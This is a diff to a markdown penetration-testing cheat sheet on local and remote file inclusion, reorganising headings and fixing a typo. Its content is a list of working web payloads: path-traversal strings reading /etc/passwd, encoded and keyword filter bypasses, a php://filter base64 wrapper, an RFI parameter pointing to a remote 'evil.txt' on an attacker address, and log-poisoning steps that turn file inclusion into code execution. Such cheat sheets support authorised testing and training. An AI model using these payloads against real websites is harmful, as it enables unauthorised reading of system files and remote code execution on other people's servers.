@@ -1,10 +1,13 @@
-## LFI Filter Bypass
+# LFI RFI
+
+### LFI Filter Bypass
+
 ```
 # For site that append .php to the end of the url:
 http://[URL]/?page=../../../../../../../etc/passwd&ext=
 
 # For site that requires certain keyword:
-http://[URL]/?page=[keyword])../../../../../../etc/password
+http://[URL]/?page=[keyword])../../../../../../etc/passwd
 
 # PHP tag base64 encode
 php://filter/convert.base64-encode/resource=/etc/passwd
@@ -15,15 +18,16 @@ http://[URL]/?page=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%
 # If site return error code on fail, use ffuf or burp intruder
 
 c:\boot.ini for windows
-
 ```
 
-## RFI
+### RFI
+
 ```
 file=http://10.11.0.4/evil.txt
 ```
 
-## LFI to RCE - Log Poisoning
+### LFI to RCE - Log Poisoning
+
 ```
 # Modify user agent
 # Read /var/log/apache2/access.log
